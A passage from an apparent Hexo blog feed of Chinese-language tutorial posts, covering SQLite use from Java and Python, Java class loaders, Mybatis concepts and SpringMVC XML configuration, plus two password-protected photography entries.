class="code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;</code></pre></div><p>退出sqlite3</p><div class="code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-title">.quit</span></code></pre></div><h3 id="Java使用"><a href="#Java使用" class="headerlink" title="Java使用"></a>Java使用</h3><p>Maven依赖</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;dependency&gt;</span>    <span class="hljs-section">&lt;groupId&gt;</span><span class="hljs-attribute">org</span>.xerial&lt;/groupId&gt;    <span class="hljs-section">&lt;artifactId&gt;</span><span class="hljs-attribute">sqlite</span>-jdbc&lt;/artifactId&gt;    <span class="hljs-section">&lt;version&gt;</span><span class="hljs-attribute">3</span>.<span class="hljs-number">46</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&lt;/version&gt;<span class="hljs-section">&lt;/dependency&gt;</span></code></pre></div><p>测试代码</p><div class="code-wrapper"><pre><code class="hljs pgsql">package com.pacemrc;<span class="hljs-keyword">import</span> java.<span class="hljs-keyword">sql</span>.*;<span class="hljs-comment">/**</span><span class="hljs-comment"> * SqliteDemo</span><span class="hljs-comment"> */</span><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> SqliteDemo &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws ClassNotFoundException, SQLException &#123;        <span class="hljs-keyword">Class</span>.forName(&quot;org.sqlite.JDBC&quot;);        String dbFile = &quot;/Users/pacemrc/tmp/user_java.db&quot;;        String url = &quot;jdbc:sqlite:&quot; + dbFile;        <span class="hljs-keyword">Connection</span> conn = DriverManager.getConnection(url);        //添加        <span class="hljs-keyword">insert</span>(conn);        //查询        <span class="hljs-keyword">select</span>(conn);        //修改        <span class="hljs-keyword">update</span>(conn);        //删除//        <span class="hljs-keyword">delete</span>(conn);        conn.<span class="hljs-keyword">close</span>();    &#125;    private static <span class="hljs-type">void</span> <span class="hljs-keyword">select</span>(<span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span>) throws SQLException &#123;        String <span class="hljs-keyword">sql</span> = &quot;select * from user&quot;;        <span class="hljs-keyword">Statement</span> <span class="hljs-keyword">statement</span> = <span class="hljs-keyword">connection</span>.createStatement();        ResultSet rs = <span class="hljs-keyword">statement</span>.executeQuery(<span class="hljs-keyword">sql</span>);        <span class="hljs-keyword">while</span> (rs.next()) &#123;            <span class="hljs-type">int</span> id = rs.getInt(&quot;id&quot;);            String <span class="hljs-type">name</span> = rs.getString(&quot;name&quot;);            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(id);            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-type">name</span>);        &#125;        rs.<span class="hljs-keyword">close</span>();        <span class="hljs-keyword">statement</span>.<span class="hljs-keyword">close</span>();    &#125;    private static <span class="hljs-type">void</span> <span class="hljs-keyword">insert</span>(<span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span>) throws SQLException &#123;        String <span class="hljs-keyword">sql</span> = &quot;insert into user( name) values(&#x27;小丽&#x27;)&quot;;        <span class="hljs-keyword">Statement</span> stat = <span class="hljs-keyword">connection</span>.createStatement();        stat.executeUpdate(<span class="hljs-keyword">sql</span>);        stat.<span class="hljs-keyword">close</span>();    &#125;    private static <span class="hljs-type">void</span> <span class="hljs-keyword">update</span>(<span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span>) throws SQLException &#123;        String <span class="hljs-keyword">sql</span> = &quot;update user set name = ? where id = ?&quot;;        PreparedStatement ps = <span class="hljs-keyword">connection</span>.prepareStatement(<span class="hljs-keyword">sql</span>);        ps.setObject(<span class="hljs-number">1</span>, &quot;小雪花&quot;);        ps.setObject(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>);        ps.executeUpdate();        ps.<span class="hljs-keyword">close</span>();    &#125;    private static <span class="hljs-type">void</span> <span class="hljs-keyword">delete</span>(<span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span>) throws SQLException &#123;        String <span class="hljs-keyword">sql</span> = &quot;delete from user where id = ?&quot;;        PreparedStatement ps = <span class="hljs-keyword">connection</span>.prepareStatement(<span class="hljs-keyword">sql</span>);        ps.setObject(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);        ps.executeUpdate();        ps.<span class="hljs-keyword">close</span>();    &#125;&#125;</code></pre></div><h3 id="Python使用"><a href="#Python使用" class="headerlink" title="Python使用"></a>Python使用</h3><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<span class="hljs-comment"># 连接到SQLite数据库，如果数据库不存在则会自动创建</span>conn = sqlite3.connect(<span class="hljs-string">&#x27;/Users/pacemrc/tmp/user_py.db&#x27;</span>)<span class="hljs-comment"># 创建一个游标对象</span>cursor = conn.cursor()<span class="hljs-comment"># 创建表</span>cursor.execute(<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">CREATE TABLE IF NOT EXISTS users (</span><span class="hljs-string">    id INTEGER PRIMARY KEY AUTOINCREMENT,</span><span class="hljs-string">    name TEXT NOT NULL,</span><span class="hljs-string">    age INTEGER NOT NULL</span><span class="hljs-string">)</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<span class="hljs-comment"># 插入数据</span>cursor.execute(<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">INSERT INTO users (name, age) VALUES (?, ?)</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>, (<span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-number">30</span>))cursor.execute(<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">INSERT INTO users (name, age) VALUES (?, ?)</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>, (<span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">25</span>))<span class="hljs-comment"># 提交事务</span>conn.commit()<span class="hljs-comment"># 查询数据</span>cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>)rows = cursor.fetchall()<span class="hljs-comment"># 打印查询结果</span><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rows:    <span class="hljs-built_in">print</span>(row)<span class="hljs-comment"># 关闭游标和连接</span>cursor.close()conn.close()</code></pre></div><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><p>适用于Java</p><h2 id="Derby"><a href="#Derby" class="headerlink" title="Derby"></a>Derby</h2><p>适用于Java</p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Database</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQLite3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>达芬奇</title>
    <link href="/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E8%BE%BE%E8%8A%AC%E5%A5%87/"/>
    <url>/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E8%BE%BE%E8%8A%AC%E5%A5%87/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5125b705bf6c5196a872fdb6f3baf6cdc5c41a52bcaa17aaaa1b340cf4827520"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>摄影教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Photograph</tag>
      
      <tag>达芬奇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>调色</title>
    <link href="/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E8%B0%83%E8%89%B2/"/>
    <url>/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E8%B0%83%E8%89%B2/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5c58e5963612a0bba4814d0d33f302c8bb9b94672ecad0c8b25a1d2d9ce2aa6b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>摄影教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Photograph</tag>
      
      <tag>调色</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自定义类加载器</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h1><p><strong>自定义类加载的作用</strong></p><ul><li>实现从自定义路径中加载类。</li></ul><p>Java默认的类加载器从指定的路径中加载类，而自定义类加载可以实现从网络、本地自定义路径或其他方式中获取字节码。</p><ul><li>实现类隔离</li></ul><p>JVM判断一个字节码对象，不仅是判断类的全路径，还会根据类加载器来判断是否是同一个类</p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mybatis理论</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Mybatis/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Mybatis/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="什么是Mybatis"><a href="#什么是Mybatis" class="headerlink" title="什么是Mybatis"></a>什么是Mybatis</h2><p>它是一款基于java的半自动ORM持久层框架，具有较高的SQL灵活性，支持高级映射(一对一，一对多)，动态SQL，延迟加载和缓存等特性，但它的数据库无关性较低。</p><h2 id="什么是ORM"><a href="#什么是ORM" class="headerlink" title="什么是ORM"></a>什么是ORM</h2><p>Object Relation Mapping，对象关系映射。对象指的是Java对象，关系指的是数据库中的关系模型，对象关系映射，指的就是在Java对象和数据库的关系模型之间建立一种对应关系，比如用一个Java的Student类，去对应数据库中的一张student表，类中的属性和表中的列一一对应。Student类就对应student表，一个Student对象就对应student表中的一行数据</p><h2 id="为什么mybatis是半自动的ORM框架"><a href="#为什么mybatis是半自动的ORM框架" class="headerlink" title="为什么mybatis是半自动的ORM框架"></a>为什么mybatis是半自动的ORM框架</h2><p>用mybatis进行开发，需要手动编写SQL语句。而全自动的ORM框架，如hibernate，则不需要编写SQL语句。用hibernate开发，只需要定义好ORM映射关系，就可以直接进行CRUD操作了。由于mybatis需要手写SQL语句，所以它有较高的灵活性，可以根据需要，自由地对SQL进行定制，也因为要手写SQL，当要切换数据库时，SQL语句可能就要重写，因为不同的数据库有不同的方言(Dialect)，所以mybatis的数据库无关性低。虽然mybatis需要手写SQL，但相比JDBC，它提供了输入映射和输出映射，可以很方便地进行SQL参数设置，以及结果集封装。并且还提供了关联查询和动态SQL等功能，极大地提升了开发的效率。并且它的学习成本也比hibernate低很多 特性</p><p><strong>参数解析</strong></p><p>$()：表示一个拼接符号，仅仅为一个纯碎的string替换，在动态SQL解析阶段将会进行变量替换。</p><p>#()：表示一个占位符号，解析为一个JDBC预编译语句（prepared statement）的参数标记符，一个<code>#&#123;&#125;</code>被解析为一个参数占位符。</p><h1 id="Mybatis执行流程"><a href="#Mybatis执行流程" class="headerlink" title="Mybatis执行流程"></a>Mybatis执行流程</h1><p><strong>图示流程</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/202103101011479.png"></p><p><strong>详细流程</strong></p><p>（1）读取MyBatis的配置文件。mybatis-config.xml为MyBatis的全局配置文件，用于配置数据库连接信息。</p><p>（2）加载映射文件。映射文件即SQL映射文件，该文件中配置了操作数据库的SQL语句，需要在MyBatis配置文件mybatis-config.xml中加载。mybatis-config.xml 文件可以加载多个映射文件，每个文件对应数据库中的一张表。</p><p>（3）构造会话工厂。通过MyBatis的环境配置信息构建会话工厂SqlSessionFactory。</p><p>（4）创建会话对象。由会话工厂创建SqlSession对象，该对象中包含了执行SQL语句的所有方法。</p><p>（5）Executor执行器。MyBatis底层定义了一个Executor接口来操作数据库，它将根据SqlSession传递的参数动态地生成需要执行的SQL语句，同时负责查询缓存的维护。</p><p>（6）MappedStatement对象。在Executor接口的执行方法中有一个MappedStatement类型的参数，该参数是对映射信息的封装，用于存储要映射的SQL语句的id、参数等信息。</p><p>（7）输入参数映射。输入参数类型可以是Map、List等集合类型，也可以是基本数据类型和POJO类型。输入参数映射过程类似于JDBC对preparedStatement对象设置参数的过程。</p><p>（8）输出结果映射。输出结果类型可以是Map、List等集合类型，也可以是基本数据类型和POJO类型。输出结果映射过程类似于JDBC对结果集的解析过程。</p><h1 id="Mybatis开发Dao层"><a href="#Mybatis开发Dao层" class="headerlink" title="Mybatis开发Dao层"></a>Mybatis开发Dao层</h1><h2 id="传统开发方式"><a href="#传统开发方式" class="headerlink" title="传统开发方式"></a>传统开发方式</h2><p>需要创建Dao层Mapper接口和其实现类，再手动创建其实现类对象进行方法调用</p><h2 id="接口代理开发方式（主流）"><a href="#接口代理开发方式（主流）" class="headerlink" title="接口代理开发方式（主流）"></a>接口代理开发方式（主流）</h2><p>仅需编写Dao层Mapper接口，由Mybatis的mapper代理自动创建接口的实现类，最后由mapper代理对象调用方法</p><p><strong>Mapper接口代理开发需要遵循以下规范</strong></p><p>映射配置文件中的<strong>namespace</strong>与mapper接口的类名相同 映射配置文件中的增删改查标签的<strong>id属性</strong>要和Mappe接口中的方法名相同 映射配置文件中的增删改查标签的<strong>parameterType属性</strong>要和Mappe接口中的方法参数相同 映射配置文件中的增删改查标签的<strong>resultType属性</strong>要和Mappe接口中方法的返回值相同</p><p><strong>示例</strong></p><p>UserMapperProxy.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapperProxy</span> &#123;      <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getAllUser</span><span class="hljs-params">()</span>;&#125;</code></pre></div><p>UserMapperProxy.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.dao.UserMapperProxy&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getAllUsers&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span>        select * from user;    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></code></pre></div><p>两种开发方式demo</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//传统方式</span><span class="hljs-type">UserMapperManualImpl</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMapperManualImpl</span>();<span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> userMapper.userList();System.out.println(list);<span class="hljs-comment">//接口代理方式</span><span class="hljs-type">InputStream</span> <span class="hljs-variable">resourceAsStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(<span class="hljs-string">&quot;mybatis.xml&quot;</span>);<span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>().build(resourceAsStream);<span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();<span class="hljs-type">UserMapperProxy</span> <span class="hljs-variable">mapperProxy</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapperProxy.class);List&lt;User&gt; allUsers = mapperProxy.getAllUser();System.out.println(allUsers);</code></pre></div><h1 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h1><ul><li>controller层</li></ul><p>同类：controller层 &#x3D; web层</p><p>作用：接收前端传过来的参数给service层进行业务操作，再将处理结果返回给前端</p><ul><li>service层</li></ul><p>组成：service接口和impl实现类</p><p>作用：定义业务逻辑处理的方法。也是一些关于数据库的操作，但不是直接和数据库打交道。service层是针对controller，也就是针对使用者。service层有接口和接口的实现类，service的impl是把mapper和service进行整合的文件。在其接口的实现类中需要导入mapper层。</p><ul><li>mapper层</li></ul><p>同类：mapper层 &#x3D; dao 层</p><p>组成：mapper接口和mapper xml文件</p><p>作用：定义对数据库CURD的操作方法。mapper层的体现是接口，只有关于对数据库操作的方法名称，具体的实现在对应的mapper文件中。</p><ul><li>entity层</li></ul><p>同类：model层 &#x3D; entity层 &#x3D; domain层</p><p>作用：用于存放实体类，与数据库中的属性值基本保持一致</p><ul><li>dto层</li></ul><p>作用：DTO（数据传输对象层），该层负责屏蔽后端的实体层，将UI层需要的数据进行重新的定义和封装。</p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SpringMVC实操</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/SpringMVC%E5%AE%9E%E6%93%8D/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/SpringMVC%E5%AE%9E%E6%93%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="基于配置文件方式开发"><a href="#基于配置文件方式开发" class="headerlink" title="基于配置文件方式开发"></a>基于配置文件方式开发</h1><h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li>导入springmvc依赖</li><li>创建controller类</li><li>创建和配置xml配置文件</li><li>配置web.xml文件</li><li>配置tomcat运行web服务</li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="导入springmvc依赖"><a href="#导入springmvc依赖" class="headerlink" title="导入springmvc依赖"></a>导入springmvc依赖</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="创建和配置controller类"><a href="#创建和配置controller类" class="headerlink" title="创建和配置controller类"></a>创建和配置controller类</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testController</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span>    <span class="hljs-meta">@ResponseBody</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test01</span><span class="hljs-params">(String msg)</span>&#123;        <span class="hljs-keyword">return</span> msg;    &#125;&#125;</code></pre></div><h3 id="创建和配置xml配置文件"><a href="#创建和配置xml配置文件" class="headerlink" title="创建和配置xml配置文件"></a>创建和配置xml配置文件</h3><p><strong>引入springmvc命名空间</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://www.springframework.org/schema/beans&gt;&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;&lt;http://www.springframework.org/schema/mvc&gt;&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;&lt;http://www.springframework.org/schema/context&gt;&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">                        &lt;http://www.springframework.org/schema/beans&gt; &lt;http://www.springframework.org/schema/beans/spring-beans.xsd&gt;</span></span><span class="hljs-string"><span class="hljs-tag">                        &lt;http://www.springframework.org/schema/mvc&gt; &lt;http://www.springframework.org/schema/mvc/spring-mvc.xsd&gt;</span></span><span class="hljs-string"><span class="hljs-tag">                        &lt;http://www.springframework.org/schema/context&gt; &lt;http://www.springframework.org/schema/context/spring-context.xsd&gt;&quot;</span>&gt;</span></code></pre></div><p><strong>配置Controller组件扫描</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;包路径&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">context:include-filter</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;annotation&quot;</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:component-scan</span>&gt;</span></code></pre></div><p><strong>配置自定义视图解析</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;viewResolver&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/jsp/&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><p><strong>配置静态资源访问</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/static/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/static/&quot;</span> /&gt;</span></code></pre></div><h3 id="配置web-xml文件"><a href="#配置web-xml文件" class="headerlink" title="配置web.xml文件"></a>配置web.xml文件</h3><p>创建DispatcherServlet核心控制器servlet，指定url映射地址为&#x2F;</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:springmvc配置文件<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><h3 id="配置tomcat运行web服务"><a href="#配置tomcat运行web服务" class="headerlink" title="配置tomcat运行web服务"></a>配置tomcat运行web服务</h3><h1 id="基于注解方式开发"><a href="#基于注解方式开发" class="headerlink" title="基于注解方式开发"></a>基于注解方式开发</h1><h2 id="开发步骤-1"><a href="#开发步骤-1" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li>导入springmvc依赖</li><li>创建和配置controller类</li><li>创建和配置config类</li><li>创建和配置init初始化类</li><li>配置tomcat运行web服务</li></ol><h2 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="导入springmvc依赖-1"><a href="#导入springmvc依赖-1" class="headerlink" title="导入springmvc依赖"></a>导入springmvc依赖</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span 